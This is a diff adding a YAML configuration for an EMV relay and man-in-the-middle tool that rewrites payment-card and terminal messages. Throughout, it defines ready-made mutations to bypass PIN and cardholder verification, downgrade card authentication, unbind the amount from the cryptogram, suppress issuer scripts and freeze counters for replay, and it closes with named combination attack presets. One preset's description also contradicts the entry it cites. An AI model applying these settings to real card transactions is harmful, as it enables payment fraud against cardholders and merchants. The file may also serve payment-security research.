@@ -1,0 +1,237 @@
+# mutations.yaml – MutationEngine configuration
+# ─────────────────────────────────────────────────────────────────────────────
+# Layer 3: Controlled Mutations for EMV relay / MitM sessions.
+# Load via: MutationEngine.from_config("mutations.yaml", os=self.os)
+# ─────────────────────────────────────────────────────────────────────────────
+
+enabled: true
+log_mutations: true
+log_path: "logs/mutations.jsonl"
+
+# ─────────────────────────────────────────────────────────────────────────────
+# 1. PDOL field mutations
+#    Applied to GPO (CLA=80 INS=A8) before it reaches the card.
+# ─────────────────────────────────────────────────────────────────────────────
+pdol_mutations:
+
+  # ── CVM bypass via amount ──────────────────────────────────────────────────
+  - tag:     "9F02"
+    value:   "000000000001"
+    enabled: false
+    comment: "Amount: 1 cent — triggers No-CVM amount threshold rule"
+
+  # ── Currency code — pair with amount mutation ──────────────────────────────
+  - tag:     "5F2A"
+    value:   "0978"
+    enabled: false
+    comment: "Currency: EUR (0978) — synchronise with amount to avoid floor-limit mismatch"
+
+  # ── Country code — force domestic / high-risk routing ─────────────────────
+  - tag:     "9F1A"
+    value:   "0276"
+    enabled: false
+    comment: "Terminal country: Germany (0276) — set to issuer country to force domestic floor limit"
+
+  # ── TTQ — disable offline PIN, force online auth ──────────────────────────
+  - tag:     "9F66"
+    value:   "36004000"
+    enabled: false
+    comment: "TTQ: qVSDC+MChip+online-cryptogram, no offline PIN, no MSD"
+
+# ─────────────────────────────────────────────────────────────────────────────
+# 2. AFL mutations
+#    Applied to tag 94 (Application File Locator) in the GPO response.
+#
+#    skip_signed  — zero offline_auth_records on every entry; defeats SDA/DDA
+#                   because no records are in the signing scope
+#    truncate     — keep only the first N entries; terminal reads fewer records
+#    remove_sfi   — drop all entries for a given SFI
+#    extend       — append fake entries to fuzz terminal error handling
+# ─────────────────────────────────────────────────────────────────────────────
+afl_mutations:
+
+  # Removes all records from the SDA/DDA signing scope — defeats offline auth
+  - mode:    skip_signed
+    enabled: false
+    comment: "AFL: zero all offline_auth_records — nothing signed"
+
+  # Keep only the first AFL entry — terminal reads fewer records (drops CVM/risk data)
+  - mode:        truncate
+    truncate_to: 1
+    enabled:     false
+    comment:     "AFL: truncate to 1 entry — suppress CVM list and risk data records"
+
+  # Drop SFI 2 entirely (often contains CDOL, CVM list, AIP risk data)
+  - mode:       remove_sfi
+    target_sfi: 2
+    enabled:    false
+    comment:    "AFL: remove SFI 2 — terminal skips those records entirely"
+
+# ─────────────────────────────────────────────────────────────────────────────
+# 3. DOL mutations (CDOL1 = 8C, CDOL2 = 8D)
+#    Applied to READ RECORD responses.
+#
+#    remove_field — strip a tag from the DOL; terminal will not include that
+#                   data element in GENERATE AC → cryptogram has no binding to it
+#    truncate     — keep only first N DOL fields
+#
+#    PDOL/CDOL desynchronisation: set PDOL 9F02=1¢ (CVM bypass) and keep CDOL1
+#    9F02 present with real amount — card's AC covers real amount but CVM was
+#    bypassed. To decouple amount from AC entirely, remove_field 9F02 from CDOL1.
+# ─────────────────────────────────────────────────────────────────────────────
+dol_mutations:
+
+  # Remove Amount from CDOL1 — cryptogram has no amount binding
+  - target_tag: "8C"
+    mode:        remove_field
+    field_tag:   "9F02"
+    enabled:     false
+    comment:     "CDOL1: remove Amount (9F02) — AC not bound to transaction amount"
+
+  # Remove CVM Results from CDOL1 — card can't verify PIN was checked
+  - target_tag: "8C"
+    mode:        remove_field
+    field_tag:   "9F34"
+    enabled:     false
+    comment:     "CDOL1: remove CVM Results (9F34) — AC not bound to CVM outcome"
+
+  # Remove CDOL2 entirely (delete tag 8D) — disables second GENERATE AC
+  # Note: use response_mutations delete mode for this
+  # - target_tag: "8D" delete is handled via response_mutations below
+
+# ─────────────────────────────────────────────────────────────────────────────
+# 4. Response TLV mutations
+#    Applied to card responses before the terminal sees them.
+# ─────────────────────────────────────────────────────────────────────────────
+response_mutations:
+
+  # ── CVM List — force No-CVM (same-length replacement, T=0 safe) ─────────
+  # Value MUST be the same byte count as the original tag value to avoid a
+  # T=0 Le mismatch on contact cards (terminal negotiates Le via 6C XX; a
+  # shorter mutated response causes an immediate transaction restart).
+  # This default is 14 bytes = 8-byte X/Y + 3×2-byte rules.
+  # Adjust the byte count to match the original 8E length from the card profile.
+  # Use condition 0x00 (Always) not 0x03 (if-terminal-supports) for contact cards.
+  - tag:     "8E"
+    mode:    replace
+    value:   "00000000000000001F001F001F00"
+    enabled: false
+    comment: "CVM List: X=0 Y=0, rules: No-CVM-Always ×3 (14 bytes, T=0 safe)"
+
+  # ── AIP — downgrade to SDA-only (clear DDA + CDA bits) ──────────────────
+  # 0x40=SDA 0x20=DDA 0x10=CVM 0x08=TRM 0x04=IssuerAuth 0x01=CDA
+  # Replace with 58 00 = SDA+CVM+TRM, DDA and CDA cleared.
+  # DO NOT use XOR against unknown card AIP — use replace for predictable result.
+  - tag:     "82"
+    mode:    replace
+    value:   "5800"
+    enabled: false
+    comment: "AIP: replace with 5800 — SDA-only, no DDA, no CDA"
+
+  # ── IAC-Denial — zero all bits (card never declines offline) ──────────────
+  - tag:     "9F0E"
+    mode:    replace
+    value:   "0000000000"
+    enabled: false
+    comment: "IAC-Denial: all zeros — no offline decline triggers"
+
+  # ── CDOL2 — delete to prevent second GENERATE AC / script processing ──────
+  - tag:     "8D"
+    mode:    delete
+    enabled: false
+    comment: "CDOL2: delete — suppresses issuer script processing"
+
+  # ── ATC (9F36) — freeze at current value for replay testing ───────────────
+  - tag:     "9F36"
+    mode:    replace
+    value:   "0001"
+    enabled: false
+    comment: "ATC: frozen at 0001 — replay / pre-play research"
+    on_ins:  ["CA"]    # only on GET DATA responses
+
+  # ── Last Online ATC (9F13) — match current ATC → velocity bypass ──────────
+  - tag:     "9F13"
+    mode:    replace
+    value:   "0001"
+    enabled: false
+    comment: "Last Online ATC: set equal to ATC — issuer sees no offline transactions"
+    on_ins:  ["CA"]
+
+  # ── Track 2 service code — flip digit 1 from 2→1 (no restrictions) ────────
+  # Tag 57: [PAN]D[Expiry][ServiceCode][DD...] — service code starts at byte PAN_len+3
+  # Modifying service code byte tests fallback / magstripe behaviour
+  - tag:     "57"
+    mode:    replace
+    value:   ""          # fill in full Track 2 hex with modified service code
+    enabled: false
+    comment: "Track 2: modify service code — set specific value for testing"
+
+  # ── Issuer Script Template 1 — suppress scripts before card sees them ─────
+  - tag:     "71"
+    mode:    delete
+    enabled: false
+    comment: "Issuer Script 1 (tag 71): delete — suppress post-auth scripts"
+
+  - tag:     "72"
+    mode:    delete
+    enabled: false
+    comment: "Issuer Script 2 (tag 72): delete — suppress second-gen scripts"
+
+# ─────────────────────────────────────────────────────────────────────────────
+# 5. Injected commands
+#    Extra APDUs sent directly to the card; responses logged, never forwarded.
+# ─────────────────────────────────────────────────────────────────────────────
+injected_commands:
+
+  # Silent ATC read after GENERATE AC
+  - trigger_ins: "AE"
+    when:        after_response
+    apdu:        "80CA9F3600"
+    repeat:      false
+    enabled:     false
+    comment:     "GET DATA: ATC (9F36) — silent read after GenAC"
+
+  # Silent PIN retry counter after GPO
+  - trigger_ins: "A8"
+    when:        after_response
+    apdu:        "80CA9F1700"
+    repeat:      false
+    enabled:     false
+    comment:     "GET DATA: PIN retry counter (9F17) — silent read after GPO"
+
+  # Silent Last Online ATC read
+  - trigger_ins: "AE"
+    when:        after_response
+    apdu:        "80CA9F1300"
+    repeat:      false
+    enabled:     false
+    comment:     "GET DATA: Last Online ATC (9F13) — silent read after GenAC"
+
+  # Silent Log Format probe before SELECT
+  - trigger_ins: "A4"
+    when:        before_command
+    apdu:        "80CA9F4F00"
+    repeat:      false
+    enabled:     false
+    comment:     "GET DATA: Log Format (9F4F) — probe before SELECT"
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Combination attack presets (enable multiple entries together)
+# ─────────────────────────────────────────────────────────────────────────────
+#
+# COMBO-A: Amount CVM bypass + TTQ online-only (contactless)
+#   pdol_mutations[0].enabled: true    (9F02 = 1¢)
+#   pdol_mutations[1].enabled: true    (5F2A = EUR)
+#   pdol_mutations[3].enabled: true    (9F66 = 36004000)
+#   response_mutations[0].enabled: true (8E = No-CVM first)
+#   injected_commands[0].enabled: true  (ATC after GenAC)
+#   injected_commands[1].enabled: true  (PIN retry after GPO)
+#
+# COMBO-B: AFL skip-signed + AIP CDA downgrade (defeats offline auth)
+#   afl_mutations[0].enabled: true     (skip_signed)
+#   response_mutations[1].enabled: true (AIP XOR 2100)
+#
+# COMBO-C: PDOL/CDOL amount desynchronisation (novel research)
+#   pdol_mutations[0].enabled: true    (PDOL 9F02 = 1¢ → CVM bypass)
+#   dol_mutations[0].enabled: true     (CDOL1 remove 9F02 → AC has no amount)
+#   response_mutations[2].enabled: true (IAC-Denial zeroed)
